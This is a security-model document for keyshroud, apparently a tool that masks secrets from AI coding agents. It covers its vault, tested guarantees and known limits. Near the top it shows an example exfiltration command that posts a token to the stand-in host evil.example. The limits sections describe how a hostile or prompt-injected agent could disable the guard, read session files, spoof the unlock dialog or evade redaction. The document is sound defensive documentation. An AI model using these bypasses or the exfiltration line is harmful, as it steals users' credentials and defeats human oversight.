# Security model

keyshroud protects against **accidental disclosure**: secrets ending up in
transcripts, provider logs, screenshots, commits, or the model's context because
a command printed them.

It does **not** make a hostile or prompt-injected agent safe. An agent that can
run `keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a
value before printing it, can exfiltrate it. If that is your threat model, use
an egress proxy that swaps placeholder credentials on the wire (for example
Infisical Agent Vault or OneCLI), restrict which secrets each session
gets with `--only`, and keep a human approving commands.

## The local vault

The local vault is encrypted at rest (AES-256-GCM); its key is in your OS keychain (macOS
keychain, Linux Secret Service, Windows DPAPI). Any program running as you can read that key, agents
included, so in this mode keyshroud does not ask before opening the vault: the same exposure as storing
a Vaultwarden master password in the keychain, and weaker than Vaultwarden's ask-every-30-minutes
default. Create the vault with `KEYSHROUD_VAULT_KEY=passphrase` to be asked (sessions end after 30
minutes).

On a Mac, a **Touch ID vault** (`KEYSHROUD_VAULT_KEY=secure-enclave`, or `keyshroud rekey --to
secure-enclave`) closes that gap while no session is open: its key is wrapped to a P-256 key held by
the Mac's Secure Enclave, which answers only after the person at the Mac approves a Touch ID sheet (or
types the Mac's password). For the session that follows (30 minutes), the key sits in `vault.session` +
`vault.token` like a passphrase session, and any program running as you can read it; `keyshroud lock`
or a shorter `KEYSHROUD_SESSION_TTL_MS` narrows that window. Touch ID proves someone is present, not
what they meant to approve: a program already running as you can show its own sheet, or change
keyshroud or its helper to capture the next approval. There is no recovery: the vault opens on that
Mac only, so run `keyshroud backup` (or `rekey --to passphrase`) before erasing or moving it. A local
vault belongs to one machine and has no recovery of its own: `keyshroud backup` is its backup, and
Vaultwarden or Bitwarden the option for several machines. `vault.json` is safe to copy only as long as
its key is not. A backup file holds every item under its passphrase alone: whoever has the file can
guess at that passphrase offline (scrypt, N=2^17, slows each guess), so choose a long one and keep
the file off the machines agents work on.

## Guarantees we test for

- secret values never appear in argv, logs, keyshroud's own diagnostics, MCP results, hook
  output, or `audit.jsonl`; an error from `bw` is shown without anything keyshroud gave it;
- new secrets are read from a masked prompt, `--stdin`, or a native dialog, never flags;
- the dialog an agent can open says it was requested by a program, warns against the
  master password, refuses names that are not one printable line, refuses the master
  password itself, and opens one at a time (30 s pause after a cancel);
- the session file, local vault, redact index, rendered templates and auth files are `0600`;
- the local vault is replaced atomically (temporary file, fsync, rename) under a lock, changes to any
  part of it fail its integrity check (within the known limits below), and a vault that fails it is
  never overwritten;
- a local vault's passphrase is set only in a terminal and never stored; it and the Vaultwarden
  master password are refused as a secret, whichever vault the secret is going to; when a vault
  that is there cannot be asked (`bw` fails, the vault file cannot be read), nothing is stored;
- env.json, auth.json and hook index writes are locked and atomic, a writer that lost its lock writes
  nothing, and a wired name is never overwritten without `--force`. The lock is the directory pi
  and omp use themselves (`<file>.lock`, beside the file a link leads to, and beside the link too),
  so their writers wait for it and cannot break it (should keyshroud be killed while it holds one,
  pi reports the lock until the next keyshroud command clears it);
- commands started by `run` and `secrets_run` never receive `BW_SESSION`,
  `BW_PASSWORD`, `BW_CLIENTID`, `BW_CLIENTSECRET` or `KEYSHROUD_PASSPHRASE` (these names and
  `BITWARDENCLI_APPDATA_DIR` cannot be wired or set by an env file either), and with `--only` the
  other wired names are removed from what the command inherits, so `--only` really limits
  what a command can read (inside pi/omp the agent process keeps the session for
  legacy `!bw` auth entries; its value is redacted from tool output);
- two values that would get one label (`<redacted:NAME>`, `<redacted:NAME (2)>`) are both masked;
- env files may contain only references and literals: a `!command` value is
  rejected, and so are variables that change what programs load or run (`PATH`,
  `NODE_OPTIONS`, `LD_*`, `DYLD_*`, `BASH_ENV`, `GIT_SSH_COMMAND`, …), which are
  also never wired or injected (the list covers the common ones, not every tool's:
  an env file still configures the program it is used with);
- an unparseable `env.json` or `auth.json` is never overwritten;
- a [source](team-secret-managers.md) is only
  read, at the address `source add` was given: a reference cannot name a server, the address must be
  https (http on localhost only; checked when it is set and again before every request), redirects are
  not followed, the certificate is checked whatever Node's environment says, and the token goes in a
  header, never a URL or argv. A vendor's CLI is started with a list of arguments, not a command line
  (on Windows a `.cmd` launcher such as `az.cmd` or `gcloud.cmd` runs through `cmd.exe`, with every
  argument escaped), without keyshroud's vault credentials in its environment, and no part of a
  reference can become one of its options. What a server or a vendor's CLI says when it fails is never
  passed on: an error names the reference, the HTTP status or the kind of failure, in keyshroud's
  own words (and, for a KV secret with several fields, the names of its fields). Source credentials, login tokens and the token in `~/.vault-token` are
  masked like any other value.

## Known limits

### The vault file

- The local vault's integrity check proves a file was sealed with its key, not that it is the latest
  one or who sealed it. A program that can write `vault.json` can put an older copy back, and can
  replace a Touch ID vault with a new one made for the same Secure Enclave key (the public half is in
  the file), which then opens on your next approval with its contents instead of yours; neither
  reveals what the vault held.
- The check that refuses a vault's own password as a secret asks `bw`: where no `bw` program is found,
  or all `bw` answers is that nobody is logged in, there is no vault on this machine to ask, and the
  value is stored; a `bw` that is there but does not start stops the save.

### Locks

- The lock on pi's and omp's `auth.json` is their own (a directory, taken over after 30 s):
  keyshroud's writers are fenced against each other and pi cannot take over a lock keyshroud holds,
  but a lock that pi holds or left behind is only as safe as that scheme is between two pi processes.
  pi 1.5 locks beside the file a link leads to, pi 1.2 and older beside the path as it is written;
  keyshroud takes the first, and the second for the path it was itself given, and a write that waits
  there cannot land once either lock is gone. What that leaves out: an older pi that reaches
  `auth.json` through a different link than keyshroud does (they then share no lock at all), so point
  both at the same path.
- The locks around calls to `bw`, the unlock dialog and the local vault's session files are simpler:
  one is taken over when its holder shows no sign of life (30 s for the session files, 60 s for `bw`,
  whose holder renews it while it works; a dialog counts as open for 5 minutes and 30 s, the time it
  may stay on screen), so a holder that was only stalled can overlap with the next one. That can mean
  a second dialog, a `bw` call that fails, or a session you have to open again; it does not put a
  value anywhere.
- Claude Code's `settings.json` has no lock of its own: `claude-setup` is safe against another
  `claude-setup` (a stalled one replaces nothing and widens no file but the one it wrote), not against
  Claude Code writing the file at the same moment.

### References and env files

- A `.env.refs` can reference **any** item in your vault, not only the ones you wired, and any secret
  your sign-in to a source may read (keep a Vault token's policy, or the machine identity's access, as
  narrow as the work needs), so read a cloned repo's `.env.refs` before running `--env-file` with it.
- `import` decides what is secret by heuristics and keeps everything else as a literal; check its plan
  before committing `.env.refs`.

### The Claude Code hook and the guard

- The `PostToolUse` hook does not see failed commands (`PostToolUseFailure` cannot rewrite output;
  `keyshroud claude-guard` masks those for the Bash tool, on macOS and Linux, once you turn it on) or
  anything a client sends as telemetry.
- It masks nothing until an index exists (written at session start, and added to by `run`,
  `secrets_run`, `get`, `inject`, `api-key`, `add`, `rotate` and `wire`; a hook that fails lets the
  output through as it is; the guard reads the same index, and does not run the command when it cannot
  start).
- It only knows wired values, keys written into `auth.json` as plain text, and values keyshroud itself
  printed (`get`, `inject`, `api-key`), so a failed `keyshroud get bw://…` or `run --no-mask` still
  shows in the clear. Run secret-using commands through `keyshroud run` or `secrets_run`, with `--only`
  (or `only`) naming the secrets the command needs, since every wired secret (every one in the
  [project's scope](project-scope.md), where there is one) is injected otherwise.
- A project's scope is a default, not a wall: it is a file in the repo, so whoever can write there (the
  agent included) can widen or remove it, a reference names any item whatever the scope says, and a
  command run from another directory is not under it.
- The guard is a setting of Claude Code and a launcher file, both writable by a program running as
  you: an agent that means to can turn it off, as it can skip `keyshroud run`; both guard against
  accidents, not against that.

### An agent with shell access as your user

- It can open a keychain-mode local vault at any time, and use a passphrase vault's session files
  until the session ends.
- It can also read `~/.config/keyshroud/session` and use `bw` directly until that session ends — after
  `setup` that reaches only the agent account; a stored master password (keychain entry or
  `~/.config/keyshroud/master-password`) it can read at any time, which is why keyshroud asks instead
  by default; otherwise run agents in a sandbox or container if that matters.
- The same agent could also draw a window that looks like the unlock dialog; when in doubt, cancel it
  and run `keyshroud unlock` in a terminal.
- Without `setup`, keyshroud shares bw's default login, so the 30-minute lock also ends a `bw` session
  you opened yourself.

### What redaction matches

- Redaction is exact-match, so a *partial* or transformed value (`${TOKEN:0:10}`, base64, a line
  wrapped by a tool) is not masked.
- Two reshaped forms are: a value is also masked without its leading and trailing spaces or line
  breaks, and a value of several lines or a JSON document (a PEM key, a service account file) is also
  masked run by run (20 or more letters, digits and `+/=_-`), so a key shown with line numbers or as a
  diff stays masked.
- Values shorter than 6 characters are not redacted (to avoid noise), so don't wire short PINs.
- Of the keys written into `auth.json` as plain text, one that is nothing but the name of a variable
  (`OPENAI_API_KEY`, `$OPENAI_API_KEY`) stands for that variable when it is set: its value is masked,
  the name is not (masking it would change every file that mentions the variable). A key with
  variables in it is masked as text and filled in as pi does, from the entry's own `env` first; the
  values in that `env` are not masked by themselves.
- A `!command` there that is not a keyshroud reference is another program's: keyshroud does not run it
  to learn what it prints, so its output is masked only when the entry has a variable's name and is
  injected.
- pi's `/secret`, `/vault_add` and `/vault_rotate` popups store a pasted value without the spaces or
  line breaks around it; for a value where those matter, use `keyshroud add --stdin`, which keeps
  everything but one line break at the very end (end the input with two if the value ends with one).

### Sources

- `sources.json` is a plain file, so a program running as you can point the Vault source at another
  https server, which then receives the token on the next read; the same program could read
  `~/.vault-token` itself.
- A token of `vault login` is used as it is: keyshroud does not renew it, and when it ends the
  references are unresolved until you log in again.
- A secret read from a source is masked from the moment keyshroud reads it, not before. Wired names
  are read at session start and whenever the hook's index is refreshed (`add`, `rotate`, `wire`,
  `source add`), source references among them: a wired `op://` reference can bring up 1Password's own
  prompt then, so a reference only one project needs belongs in its `.env.refs`. A reference that sits
  in a wiring file and that no command injects is not read from a source just to mask it.
- When the server is away, each request waits up to 10 seconds (a first read with AppRole makes three;
  a vendor's CLI gets 30) and the names are unresolved.
- Why a source refused is told only by kind (an HTTP status; for a vendor's CLI: not signed in,
  refused access, not found, or just "failed"), guessed from the CLI's message, so the kind can be
  wrong; the message itself is in your terminal when you run that CLI.
- keyshroud's Vault and Infisical code is tested against real servers; the `op`, `gcloud` and `az`
  paths only against stand-in CLIs.

Report vulnerabilities privately — see [SECURITY.md](../SECURITY.md).
